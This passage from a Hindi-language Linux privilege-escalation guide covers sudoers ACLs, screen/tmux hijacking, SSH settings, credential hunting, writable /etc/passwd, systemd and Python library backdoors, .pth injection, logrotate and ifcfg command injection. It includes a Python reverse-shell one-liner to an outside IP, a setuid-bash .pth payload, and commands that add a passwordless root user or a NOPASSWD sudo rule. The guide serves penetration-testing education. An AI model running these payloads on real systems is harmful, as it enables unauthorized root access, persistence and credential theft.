getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```

### sudoers drop-ins में छिपा ACL backdoor

एक आम misconfiguration यह है कि `/etc/sudoers.d/` में `440` mode वाली root-owned फ़ाइल ACL के ज़रिए किसी कम privileges वाले user को अब भी write access देती है।

```bash
ls -l /etc/sudoers.d/*
getfacl /etc/sudoers.d/<file>
```

अगर आपको `user:alice:rw-` जैसा कुछ दिखे, तो restrictive mode bits के बावजूद user sudo rule जोड़ सकता है:

```bash
echo 'alice ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/<file>
visudo -cf /etc/sudoers.d/<file>
sudo -l
```

यह ACL persistence/privesc path हाई-इम्पैक्ट है, क्योंकि केवल `ls -l` देखकर की गई समीक्षा में इसे आसानी से नज़रअंदाज़ किया जा सकता है।

## खुले shell sessions

दूसरे user के लिए GNU Screen access केवल उसके version पर नहीं, बल्कि **चल रहे session के configuration और ACL** पर निर्भर करता है। [GNU Screen के दस्तावेज़](https://www.gnu.org/software/screen/manual/html_node/Multiuser-Session.html) के अनुसार, इसे multiuser support के साथ build करना ज़रूरी है; `multiuser on` और `acladd` या उपयुक्त `aclchg` grant से दूसरे user को attach करने की अनुमति मिलती है। [Manual में cross-user session lookup के लिए setuid-root भी ज़रूरी है](https://www.gnu.org/software/screen/manual/html_node/Invoking-Screen.html)। दिखाई देने वाला root-owned socket या अकेला SUID `screen` binary इस बात का प्रमाण नहीं है कि root shell से attach किया जा सकता है। इसे escalation मानने से पहले पुष्टि करें कि live session multiuser है, मौजूदा user के पास input/command की प्रभावी अनुमति है, और उस session में shell privileged owner के रूप में चल रहा है।

### screen sessions को hijack करना

**screen sessions की सूची बनाएँ**

```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions

# Socket locations (some systems expose one as symlink of the other)
ls /run/screen/ /var/run/screen/ 2>/dev/null
```

![screen sessions hijacking - Socket locations (कुछ सिस्टम में इनमें से एक, दूसरे के symlink के रूप में उपलब्ध होता है): ls /run/screen/ /var/run/screen/ 2 /dev/null](<../../images/image (141).png>)

**किसी session से जुड़ें**

```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```

## tmux sessions hijacking

यह **पुराने tmux versions** की समस्या थी। मैं non-privileged user के रूप में root द्वारा बनाए गए tmux (v2.1) session को hijack नहीं कर पाया।

**tmux sessions की सूची बनाएं**

```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```

![Socket locations (कुछ सिस्टम में इनमें से एक दूसरे के symlink के रूप में उपलब्ध होता है) - tmux sessions hijacking: tmux -S /tmp/dev sess ls उस socket का उपयोग करके सूची देखें; आप उस socket में tmux session शुरू कर सकते हैं...](<../../images/image (837).png>)

**किसी session से जुड़ें**

```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```

**HTB के Valentine box** को उदाहरण के लिए देखें।

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

ऐतिहासिक vulnerability अवधि के दौरान प्रभावित Debian या derivative OpenSSL builds से generate की गई keys में अनुमान लगाने योग्य randomness हो सकती है; host का मौजूदा distribution या patched OpenSSL version यह साबित नहीं करता कि कोई पुरानी key कैसे generate की गई थी। **विशिष्ट key** को उपयुक्त historical blacklist और उसके provenance के आधार पर जाँचें। Debian का [`ssh-vulnkey` manual](https://manpages.debian.org/wheezy/openssh-client/ssh-vulnkey.1.en.html) public keys और `authorized_keys` जाँचने का तरीका बताता है, और [DSA-1571-1](https://security-tracker.debian.org/tracker/DSA-1571-1) OpenSSL fix दर्ज करता है। किसी privileged account की `authorized_keys` में entry privilege escalation का सुराग तभी है, जब उससे मेल खाने वाली private key वापस हासिल की जा सके और प्रभावी SSH policy उस account के लिए उस key को अब भी स्वीकार करती हो; कमज़ोर **host** key अपने-आप में login credential नहीं होती। Compromised keys को बदलें और उनके पुराने authorizations हटाएँ।

### SSH की दिलचस्प configuration values

- **PasswordAuthentication:** बताता है कि password authentication की अनुमति है या नहीं। Upstream OpenSSH का default `yes` है; distribution configuration इसे override कर सकती है।
- **PubkeyAuthentication:** बताता है कि public key authentication की अनुमति है या नहीं। Default `yes` है।
- **PermitEmptyPasswords**: जब password authentication की अनुमति हो, तो यह बताता है कि server खाली password strings वाले accounts में login की अनुमति देता है या नहीं। Default `no` है।

### Login control files

ये files तय करती हैं कि कौन login कर सकता है और कैसे:

- **`/etc/nologin`**: मौजूद होने पर, non-root logins को रोकती है और अपना message दिखाती है।
- **`/etc/securetty`**: उन जगहों को सीमित करती है जहाँ root login कर सकता है (TTY allowlist)।
- **`/etc/motd`**: login के बाद दिखाया जाने वाला banner (environment या maintenance की जानकारी leak कर सकता है)।

### PermitRootLogin

यह तय करता है कि root ssh का उपयोग करके login कर सकता है या नहीं। Upstream OpenSSH का default `prohibit-password` है; distribution configuration इसे override कर सकती है। संभावित values:

- `yes`: root password और private key का उपयोग करके login कर सकता है
- `without-password` या `prohibit-password`: root केवल private key से login कर सकता है
- `forced-commands-only`: root केवल private key से login कर सकता है और तभी, जब commands options निर्दिष्ट हों
- `no` : नहीं

### Trusted SSH user certificate authorities

`TrustedUserCAKeys` उन public keys को निर्दिष्ट करता है जिन पर sshd **user** certificates sign करने के लिए भरोसा करता है। अगर संबंधित private CA key किसी कम privileged user द्वारा पढ़ी जा सकती है, तो जाँचें कि certificate कौन प्राप्त कर सकता है और वह किन account principals के रूप में authenticate कर सकता है। `AuthorizedPrincipalsFile` या `AuthorizedPrincipalsCommand` स्वीकार किए जाने वाले names को सीमित कर सकता है; इनमें से कोई भी configured न हो, तो certificate में target account का नाम होना चाहिए। `PermitRootLogin prohibit-password` root password authentication को रोकता है, लेकिन certificate authentication की अनुमति दे सकता है। केवल key path का उजागर होना access साबित नहीं करता: public/private key pair, प्रभावी `Match` rules, account policy, key passphrase, revocation और स्वीकार किए जाने वाले signature algorithms की पुष्टि करें। Enumeration output में private-key bytes शामिल न करें। [OpenSSH server configuration manual](https://man.openbsd.org/sshd_config#TrustedUserCAKeys) देखें।

अगर कोई privilege-delegation rule मौजूदा user को key owner की identity के तहत बिना प्रतिबंध वाला [certificate signer जैसे `ssh-keygen -s`](https://man.openbsd.org/ssh-keygen#-s) चलाने देता है, तो private CA key को पढ़े बिना भी उसका उपयोग संभव हो सकता है। Exact allowed command और arguments का मिलान signer account की key तक पहुँच, प्रभावी sshd configuration द्वारा trusted public CA, target account के लिए स्वीकार principal, certificate की validity और उस account की login policy से करें। Delegated signer command या trusted CA file अकेले दूसरे account तक access साबित नहीं करते; passive enumeration के दौरान test certificate sign न करें।

### AuthorizedKeysFile

यह उन files को निर्दिष्ट करता है जिनमें user authentication के लिए इस्तेमाल की जा सकने वाली public keys होती हैं। इसमें `%h` जैसे tokens हो सकते हैं, जिन्हें home directory से बदल दिया जाएगा। **आप absolute paths निर्दिष्ट कर सकते हैं** (जो `/` से शुरू होते हैं) या **user के home से relative paths**। उदाहरण के लिए:

```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```

वह configuration बताएगा कि यदि आप user "**testusername**" की **private** key से login करने की कोशिश करते हैं, तो ssh आपकी key की public key की तुलना `/home/testusername/.ssh/authorized_keys` और `/home/testusername/access` में मौजूद keys से करेगा।

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding आपको keys (बिना passphrases के!) अपने server पर छोड़ने के बजाय **अपनी local SSH keys का इस्तेमाल करने** देता है। इसलिए, आप ssh के ज़रिए किसी **host पर jump** कर पाएँगे और वहाँ से **अपनी initial host में मौजूद key का इस्तेमाल करके** किसी **दूसरे host पर jump** कर पाएँगे।

आपको यह option `$HOME/.ssh.config` में इस तरह set करना होगा:

```
Host example.com
  ForwardAgent yes
```

ध्यान दें कि यदि `Host` हर बार `*` हो, जब उपयोगकर्ता किसी दूसरी मशीन पर जाता है, तो उस होस्ट को keys तक पहुँच मिल सकती है (जो एक सुरक्षा समस्या है)।

फ़ाइल `/etc/ssh_config` इन **options** को **override** कर सकती है और इस configuration को अनुमति दे सकती है या अस्वीकार कर सकती है।\
फ़ाइल `/etc/sshd_config` keyword `AllowAgentForwarding` के ज़रिए ssh-agent forwarding को **अनुमति** दे सकती है या **अस्वीकार** कर सकती है (डिफ़ॉल्ट रूप से अनुमति है)।

यदि आपको किसी environment में Forward Agent configured मिले, तो अगला पेज पढ़ें, क्योंकि **आप इसका दुरुपयोग करके privileges escalate कर सकते हैं**:


{{#ref}}
../../user-information/ssh-forward-agent-exploitation.md
{{#endref}}

## रोचक फ़ाइलें

### प्रोफ़ाइल फ़ाइलें

फ़ाइल `/etc/profile` और `/etc/profile.d/` के अंदर की फ़ाइलें **ऐसी scripts हैं जो उपयोगकर्ता द्वारा नया shell चलाने पर execute होती हैं**। इसलिए, यदि आप इनमें से किसी को **लिख या modify कर सकते हैं, तो आप privileges escalate कर सकते हैं**।

```bash
ls -l /etc/profile /etc/profile.d/
```

अगर कोई अजीब profile script मिले, तो उसमें **संवेदनशील जानकारी** की जाँच करें।

### Passwd/Shadow फ़ाइलें

OS के आधार पर, `/etc/passwd` और `/etc/shadow` फ़ाइलों के नाम अलग हो सकते हैं या उनका backup मौजूद हो सकता है। इसलिए **इन सभी को ढूँढ़ने** और **यह जाँचने** की सलाह दी जाती है कि क्या आप इन्हें पढ़ सकते हैं, ताकि पता चले कि फ़ाइलों में **hashes** हैं या नहीं:

```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```

कुछ मामलों में आपको `/etc/passwd` (या समकक्ष) फ़ाइल में **password hashes** मिल सकते हैं.

```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```

### लिखने योग्य /etc/passwd

सबसे पहले, निम्न में से किसी एक कमांड से पासवर्ड जनरेट करें।

```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```

फिर उपयोगकर्ता `hacker` जोड़ें और जनरेट किया गया पासवर्ड जोड़ें।

```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```

उदाहरण: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

अब आप `hacker:hacker` के साथ `su` कमांड का उपयोग कर सकते हैं।

वैकल्पिक रूप से, बिना पासवर्ड वाला dummy user जोड़ने के लिए आप निम्नलिखित पंक्तियों का उपयोग कर सकते हैं।\
चेतावनी: इससे मशीन की मौजूदा सुरक्षा कमज़ोर हो सकती है।

```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```

नोट: BSD प्लेटफ़ॉर्म में `/etc/passwd` की जगह `/etc/pwd.db` और `/etc/master.passwd` होते हैं। साथ ही, `/etc/shadow` का नाम बदलकर `/etc/spwd.db` कर दिया जाता है।

आपको जाँचना चाहिए कि क्या आप **कुछ संवेदनशील फ़ाइलों में लिख सकते हैं**। उदाहरण के लिए, क्या आप किसी **service configuration file** में लिख सकते हैं?

```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```

उदाहरण के लिए, यदि मशीन पर **tomcat** server चल रहा है और आप **/etc/systemd/ के अंदर Tomcat service configuration file में बदलाव कर सकते हैं,** तो आप इन पंक्तियों में बदलाव कर सकते हैं:

```
ExecStart=/path/to/backdoor
User=root
Group=root
```

आपका backdoor अगली बार tomcat शुरू होने पर execute होगा।

### फ़ोल्डर जाँचें

इन फ़ोल्डरों में backups या दिलचस्प जानकारी हो सकती है: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (संभवतः आप आख़िरी फ़ोल्डर को पढ़ नहीं पाएँगे, फिर भी कोशिश करें)

```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```

### अजीब लोकेशन/स्वामित्व वाली फ़ाइलें

```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
      do printf "  Group $g:\n";
      find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
      done
done
```

### पिछले कुछ मिनटों में संशोधित की गई फ़ाइलें

```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```

### Sqlite DB फ़ाइलें

```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```

पढ़ने योग्य एप्लिकेशन डेटाबेस में, usernames और password hashes के लिए table और column names देखें। किसी hash को ढूँढ़ना, उसका password रिकवर करना और यह साबित करना कि वह किसी local account पर दोबारा इस्तेमाल हुआ है—ये अलग-अलग चरण हैं; केवल 32-character की सामान्य hexadecimal string से MD5 या account access का अनुमान नहीं लगाया जा सकता।

### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml files

```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```

अगर readable shell history में `sudo` command के बाद कोई छोटी, password जैसी line दिखे, तो उसके आसपास की lines को manually जाँचें। सामान्य `sudo` prompt पर दर्ज किया गया password shell history में सहेजा नहीं जाता; उसके बाद की line केवल गलती से shell में दर्ज हुआ input हो सकती है, किसी valid password का प्रमाण नहीं। `.sudo_as_admin_successful` marker पहले किए गए उपयोग को दर्ज करता है, मौजूदा authorization को नहीं।

### Hidden files

```bash
find / -type f -iname ".*" -ls 2>/dev/null
```

### **PATH में Script/Binaries**

```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```

### **वेब फ़ाइलें**

```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```

### **बैकअप**

बैकअप डायरेक्टरी के अंदर मौजूद पढ़ी जा सकने वाली फ़ाइलों के साथ-साथ उन फ़ाइलों की भी जाँच करें जिनके **नाम** में `backup` हो: अपारदर्शी नाम या encrypted extension वाला archive भी पुराने application data को उजागर कर सकता है। Encrypted archive केवल संभावित exposure है। Password recovery, उसकी सामग्री की जाँच, application hash की recovery और उस password का Unix account के लिए दोबारा उपयोग—ये अलग-अलग चरण हैं, जिन्हें सत्यापित करना ज़रूरी है; archive में मौजूद hash से यह साबित नहीं होता कि उससे स्थानीय रूप से login किया जा सकता है।

पढ़े जा सकने वाले virtual-machine backups की भी इसी तरह जाँच करें। VirtualBox की `.vbox` configuration संलग्न `.vdi` images की पहचान कर सकती है और encrypted disk-key metadata रख सकती है; [VirtualBox के दस्तावेज़ों के अनुसार encrypted data key VM configuration में संग्रहीत होती है](https://docs.oracle.com/en/virtualization/virtualbox/7.0/user/AdvancedTopics.html)। Offline disk review तभी संभव है जब configuration और image—दोनों तक पहुँच हो। Guest volume में अपनी अलग [LUKS encryption layer](https://gitlab.com/cryptsetup/cryptsetup/-/blob/main/man/cryptsetup.8.adoc) हो सकती है, जिसके लिए अलग key की ज़रूरत होगी। अधिकृत decryption के बाद भी पुरानी scripts या configuration में password हो सकता है; इसे स्थानीय escalation कहने से पहले यह सत्यापित करें कि credential किसी host account के लिए अभी भी मान्य है और उसकी प्रभावी `sudo` policy किसी privileged command की अनुमति देती है। Passive enumeration के दौरान images को copy, decrypt या mount किए बिना paths और permissions की सूची बनाएँ।

पढ़े जा सकने वाले archive की जाँच करते समय, कुछ भी extract करने से पहले उसके member names की सूची देखें: छिपी हुई authenticator files, recovery-code material या SSH keys मौजूद हो सकती हैं, भले ही उनकी live copies सुरक्षित हों। फ़ाइल के नाम से केवल एक सुराग मिलता है; सामग्री और किसी भी account reuse को अलग से सत्यापित करें।

Backup directories में **किसी दूसरे user के स्वामित्व वाले पढ़े जा सकने वाले archives** को प्राथमिकता दें—खासकर root-owned archives और वे, जिन्हें group membership के ज़रिए पढ़ा जा सकता है। पुराने archive में configuration या authentication secret हो सकता है, भले ही उसकी live copy सुरक्षित हो। [Backrest](https://garethgeorge.github.io/backrest/) जैसे स्थानीय backup UI के लिए, service का प्रभावी account जाँचें और यह भी कि क्या कम privilege वाला user उसकी configuration पढ़ सकता है या UI में authenticate कर सकता है। इसके [hooks](https://garethgeorge.github.io/backrest/docs/hooks) और [restic command interface](https://github.com/garethgeorge/backrest/blob/main/proto/v1/service.proto) daemon के file और command privileges के साथ काम कर सकते हैं; केवल loopback listener से impact तय नहीं होता। Backrest का `passwordBcrypt`, इसके [authentication code](https://github.com/garethgeorge/backrest/blob/main/internal/auth/auth.go) में मौजूद base64-encoded bcrypt hash है, plaintext password नहीं। Exposed archive या UI को privilege boundary मानने से पहले service identity, उपयोग योग्य credentials और संबंधित plan या repository तक पहुँच की पुष्टि करें।

```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```

### पासवर्ड वाली ज्ञात फ़ाइलें

[**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) का code देखें। यह **ऐसी कई संभावित फ़ाइलों को खोजता है जिनमें पासवर्ड हो सकते हैं**।\
ऐसा करने के लिए आप **एक और दिलचस्प tool** इस्तेमाल कर सकते हैं: [**LaZagne**](https://github.com/AlessandroZ/LaZagne)। यह एक open source application है, जिसका इस्तेमाल Windows, Linux और Mac पर स्थानीय computer में सहेजे गए बहुत सारे पासवर्ड निकालने के लिए किया जाता है।

अगर `/etc/guacamole/guacamole.properties` पढ़ा जा सकता है, तो उसकी `mysql-*`, `postgresql-*` या `sqlserver-*` database connection settings देखें। अगर खाते को Guacamole JDBC tables पढ़ने की अनुमति है, तो `guacamole_connection_parameter` में सहेजे गए SSH `username`, `password`, `private-key` या `passphrase` मान हो सकते हैं। पहले connection IDs और parameter names देखें, फिर केवल संबंधित rows की जाँच करें; सहेजा गया मान दोबारा इस्तेमाल किया जा सकने वाला secret होने के बजाय dynamic token या vault reference हो सकता है। [Guacamole JDBC schema](https://guacamole.apache.org/doc/gug/jdbc-auth-schema.html) और [SSH connection parameters](https://guacamole.apache.org/doc/gug/configuring-guacamole.html) देखें।

[pswm password manager](https://github.com/Julynx/pswm#usage) डिफ़ॉल्ट रूप से `~/.local/share/pswm/pswm` पर एक encrypted vault सहेजता है। अगर किसी अन्य user का vault दिखाई दे, तो उसका ownership और यह जाँचें कि क्या आपका खाता वास्तव में उसे पढ़ सकता है। केवल vault का path credentials उजागर नहीं करता; उसका master password recover करना, दोबारा इस्तेमाल किया जा सकने वाला account password ढूँढ़ना और उस खाते के privileges की पुष्टि करना अलग-अलग चरण हैं।

[Passpie का डिफ़ॉल्ट database](https://passpie.readthedocs.io/en/latest/faq.html#what-is-a-passpie-database) `~/.passpie/` है। इसमें `.keys` keyring और group directories के अंदर encrypted `.pass` credential files होती हैं। दिखाई देने वाली database directory केवल एक संभावित path बताती है: key और संबंधित encrypted entry तक पहुँच, आवश्यक master passphrase और recovered credential के अधिक privileges वाले खाते से जुड़े होने की पुष्टि करें। Passpie [custom database paths](https://passpie.readthedocs.io/en/latest/getting_started.html#multiple-databases) भी support करता है, इसलिए डिफ़ॉल्ट path में सब कुछ शामिल नहीं है। Automated enumeration में credentials export करने या key material print करने के बजाय केवल metadata की सूची बनानी चाहिए।

### Logs

अगर आप logs पढ़ सकते हैं, तो उनमें **दिलचस्प/गोपनीय जानकारी मिल सकती है**। Log जितना अजीब होगा, उतना ही दिलचस्प होगा (शायद)।\
इसके अलावा, कुछ गलत तरीके से configured (backdoored?) **audit logs** आपको audit logs के अंदर **पासवर्ड दर्ज करने** दे सकते हैं, जैसा कि इस post में बताया गया है: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).<sup>[[36]](#references)</sup>

```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```

लॉग पढ़ने के लिए [**adm**](../../user-information/interesting-groups-linux-pe/index.html#adm-group) समूह बहुत उपयोगी होगा।

### Shell फ़ाइलें

```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```

### Generic Creds Search/Regex

आपको उन फ़ाइलों की भी जाँच करनी चाहिए जिनके **नाम** या **कंटेंट** में "**password**" शब्द हो। साथ ही, logs में IPs और emails या hashes regexps भी जाँचें।\
मैं यहाँ यह सब करने का तरीका नहीं बताने वाला, लेकिन अगर आपकी रुचि है, तो आप [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) द्वारा किए जाने वाले आखिरी checks देख सकते हैं।

## Writable files

### Python library hijacking

अगर आपको पता है कि python script **कहाँ से** execute होने वाली है और आप उस folder में **लिख सकते हैं** या python libraries को **modify कर सकते हैं**, तो आप OS library को modify करके उसमें backdoor डाल सकते हैं (अगर आप उस जगह लिख सकते हैं जहाँ से python script execute होने वाली है, तो os.py library को copy और paste करें)।

**library में backdoor डालने** के लिए, os.py library के अंत में बस यह line जोड़ें (IP और PORT बदलें):

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

#### `site.addsitedir()` द्वारा प्रोसेस की जाने वाली writable `.pth` फ़ाइल

`site.addsitedir(DIR)` को `sys.path.append(DIR)` के बराबर न समझें। यह `DIR` में मौजूद हर `*.pth` फ़ाइल को भी प्रोसेस करता है। `import` से शुरू होने वाली और उसके बाद space या tab वाली पंक्ति Python code के रूप में execute होती है। इसके बजाय, path वाली पंक्तियों को site directory के सापेक्ष resolve किया जाता है और केवल तभी जोड़ा जाता है जब वे मौजूद हों।<sup>[[38]](#references)</sup>

यह privilege escalation का कारण बनता है, जब sudo के ज़रिए चलाने की अनुमति वाला या अन्यथा privileged Python program, `site.addsitedir()` को ऐसी directory पर call करता है जो मौजूदा user या उसके किसी group द्वारा writable हो। privileged program अपनी सामान्य कार्रवाई शुरू करने से पहले, अपना import path सेट करते समय `.pth` code चलाता है।<sup>[[38]](#references)[[39]](#references)</sup>

```bash
# Find explicit consumers and inspect every selected directory's ownership
grep -R "site\.addsitedir" /opt /usr/local 2>/dev/null
namei -l /opt/app/plugins/dev
find /opt/app/plugins/dev -maxdepth 1 -type f -name '*.pth' -ls

# Verify execution through a one-line path configuration file
printf '%s\n' "import os; os.system('id')" > /opt/app/plugins/dev/probe.pth
sudo /usr/bin/python3 /opt/app/controller.py status
```

Executable `.pth` सामग्री एक ही पंक्ति में होनी चाहिए, लेकिन semicolons से कई statements लिखे जा सकते हैं। उदाहरण के लिए, root के रूप में चलने वाला कोड Bash की setuid कॉपी बना सकता है; उसकी effective ID बनाए रखने के लिए Bash को `-p` के साथ चलाएँ।<sup>[[39]](#references)</sup>

```bash
printf '%s\n' "import os; os.system('cp /bin/bash /tmp/rootshell; chmod 4755 /tmp/rootshell')" \
  > /opt/app/plugins/dev/pwn.pth
sudo /usr/bin/python3 /opt/app/controller.py status
/tmp/rootshell -p
```

`-S` विकल्प केवल Python के automatic `site` initialization को disable करता है। यह उस program को सुरक्षित नहीं करता जो स्पष्ट रूप से `site` import करता है और `site.addsitedir()` को call करता है। Privileged import paths से attacker-writable directories हटाएँ और सुनिश्चित करें कि directory और उसकी `.pth` files का ownership privileged administrator के पास हो तथा केवल वही उनमें लिख सके।<sup>[[38]](#references)[[39]](#references)</sup>

### Logrotate exploitation

एक privileged `logrotate` job cross-user file-write path बना सकता है, जब वह किसी ऐसे directory के नीचे मौजूद log को वास्तव में rotate करता है जिसे कम privileges वाला user rotation के दौरान replace या redirect कर सकता है। केवल writable log मिलना जाँच का एक संकेत है। सक्रिय rule और उसके `create`, `olddir`, तथा `su` directives की पुष्टि करें; scheduler की प्रभावी identity; log के parent directory पर write और search अधिकार; और यह कि installed build और policy destination बदलने की अनुमति देते हैं या नहीं। Startup-file write से command execution होने के लिए बाद में चलने वाले privileged shell को बनी हुई file load भी करनी होगी। Rotation trigger किए बिना या race आज़माए बिना schedule, rule, version/packaging और path metadata की जाँच करें।

> [!TIP]
> `3.18.0` या किसी भी version string को अकेले exploitability की सीमा न मानें। [Upstream का change log](https://github.com/logrotate/logrotate/blob/main/ChangeLog.md) कई releases में directory और symlink hardening दर्ज करता है, और distributions fixes को backport कर सकती हैं। [Upstream manual](https://github.com/logrotate/logrotate/blob/main/logrotate.8.in) सुझाव देता है कि non-privileged users के control वाले directories में root द्वारा logs rotate किए जाने पर `su` का उपयोग करें; प्रभावी rule और वास्तविक behavior की पुष्टि करें।

इस vulnerability के बारे में अधिक जानकारी इस page पर मिल सकती है: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).<sup>[[37]](#references)</sup>

आप इस vulnerability का exploit [**logrotten**](https://github.com/whotwagner/logrotten) से कर सकते हैं।

यह vulnerability [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs)** से बहुत मिलती-जुलती है, इसलिए जब भी पता चले कि आप logs बदल सकते हैं, तो जाँचें कि उन logs को कौन manage कर रहा है और क्या symlinks से logs बदलकर privileges escalate किए जा सकते हैं।

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f).<sup>[[20]](#references)</sup>

`ifcfg-*` file जाँच का एक संकेत है, जब कम privileges वाला user उसे बना या बदल सकता हो **और** कोई privileged network-activation path उसी file को पढ़ता हो। प्रभावी file और directory permissions, चुने गए interface, installed `ifup`/`ifdown` implementation और उसे invoke करने वाले की पुष्टि करें। केवल writable file से execution नहीं होता। [Red Hat की RHEL 7 networking guide](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html/networking_guide/sec-using_networkmanager_with_sysconfig_files) legacy network scripts और NetworkManager में अंतर बताती है: NetworkManager स्वयं legacy scripts को trigger नहीं करता। [RHEL 8 के दस्तावेज़](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/configuring_and_managing_networking/assembly_legacy-network-scripts-support-in-rhel_configuring-and-managing-networking) के अनुसार, उसका default `ifup`/`ifdown` NetworkManager का उपयोग करता है, जबकि optional legacy package shell scripts देता है।

ऐसे system पर जो वास्तव में privileged legacy scripts का उपयोग करता है, unquoted और shell-sourced `ifcfg-*` assignment, जैसे `NAME=`, code-execution boundary पार कर सकता है। Exact parser, value और activation path की पुष्टि करें; filename या NetworkManager की मौजूदगी के आधार पर shell interpretation का अनुमान न लगाएँ। ऐसा sudo-allowed wrapper जो caller के input को `ifcfg-*` file में लिखता है और फिर legacy `ifup` call करता है, इस boundary तक पहुँचने का एक अलग रास्ता है—भले ही caller सीधे file edit न कर सके।

उदाहरण के लिए: _/etc/sysconfig/network-scripts/ifcfg-1337_

```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```

(_Network और /bin/id के बीच की खाली जगह पर ध्यान दें_)

### **init, init.d, systemd, और rc.d**

